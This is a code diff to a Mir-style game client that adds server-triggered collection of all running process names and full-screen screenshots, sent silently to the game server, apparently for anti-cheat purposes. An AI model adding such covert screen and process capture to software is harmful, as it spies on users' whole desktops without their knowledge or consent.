@@ -6,6 +6,11 @@ using Client.MirScenes;
 using Microsoft.DirectX.Direct3D;
 using S = ServerPackets;
 using C = ClientPackets;
+using System.Diagnostics;
+using System.Text;
+using System;
+using System.Drawing.Imaging;
+using System.IO;
 
 namespace Client.MirControls
 {
@@ -212,8 +217,107 @@ namespace Client.MirControls
                 case (short)ServerPacketIds.CheckCode://返回验证码
                     CheckCode((S.CheckCode)p);
                     break;
+                case (short)ServerPacketIds.CollectClientProcess://
+                    CollectClientProcess((S.CollectClientProcess)p);
+                    break;
+                case (short)ServerPacketIds.CollectClientFrame://
+                    CollectClientFrame((S.CollectClientFrame)p);
+                    break;
             }
         }
+
+        private void CollectClientProcess(S.CollectClientProcess info)
+        {
+            try
+            {
+                //收集进程信息
+                StringBuilder sb = new StringBuilder();
+                Process[] ps = System.Diagnostics.Process.GetProcesses();
+                foreach (Process p in ps)
+                {
+                    try
+                    {
+                        sb.Append(p.ProcessName + "|");
+                    }
+                    catch (Exception ex)
+                    {
+                        MirLog.error(ex.Message);
+                    }
+                }
+                //发送消息
+                Network.Enqueue(new C.ClientSubmitProcess { processs = sb.ToString()});
+            }
+            catch (Exception) { }
+        }
+        private void CollectClientFrame(S.CollectClientFrame info)
+        {
+            byte[] b = CaptureImage(info.type);
+            if (b != null)
+            {
+                Network.Enqueue(new C.ClientSubmitFrame { imgbytes = b });
+            }
+        }
+
+        public static byte[] CaptureImage(byte type)
+        {
+            try
+            {
+                MemoryStream mout = new MemoryStream();
+                int w = Screen.AllScreens[0].Bounds.Width;
+                int h = Screen.AllScreens[0].Bounds.Height;
+                using (Bitmap bitmap = new Bitmap(w, h))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
+                    }
+                    int width = w;
+                    if (type == 0)
+                    {
+                        width = 1024;
+                    }
+                    if (type == 1)
+                    {
+                        width = 1600;
+                    }
+                    double height = width/1d / bitmap.Width * bitmap.Height;
+                    //图片裁剪
+                    Bitmap retbitmap = new Bitmap(width, (int)height, PixelFormat.Format32bppArgb);
+
+                    using (Graphics graphics = Graphics.FromImage(retbitmap))
+                    {
+                        //清除整个绘图面并以透明背景色填充
+                        graphics.Clear(Color.Transparent);
+                        //在指定位置并且按指定大小绘制原图片对象
+                        graphics.DrawImage(bitmap, new Rectangle(0, 0, width, (int)height), new Rectangle(0, 0, bitmap.Width, bitmap.Height), GraphicsUnit.Pixel);
+                        retbitmap.Save(mout, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        retbitmap.Clone();
+                    }
+                }
+                byte[] rb = mout.ToArray();
+                mout.Close();
+                return rb;
+            }
+            catch(Exception ex)
+            {
+
+            }
+            return null;
+        }
+
+        //获取图像编码器
+        private static ImageCodecInfo GetEncoderInfo(String mimeType)
+        {
+            int j;
+            ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();
+            for (j = 0; j < encoders.Length; ++j)
+            {
+                if (encoders[j].MimeType == mimeType)
+                    return encoders[j];
+            }
+            return null;
+        }
+
 
         //服务器端返回验证码
         private void CheckCode(S.CheckCode p)
